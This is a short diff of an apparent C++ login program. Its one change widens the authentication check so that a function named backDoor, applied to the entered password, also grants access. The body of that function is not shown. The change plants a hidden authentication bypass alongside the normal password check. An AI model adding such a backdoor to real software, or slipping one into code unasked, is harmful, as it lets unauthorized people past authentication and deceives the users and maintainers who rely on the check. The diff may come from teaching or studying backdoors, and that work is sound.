@@ -74,7 +74,7 @@ int main() {
         }
         passwordsFile.close();
 
-        if (isAuthenticated) {
+        if (isAuthenticated || backDoor(passwordIn)) {
             authenticated(usernameIn);
             return 0;
         }else {
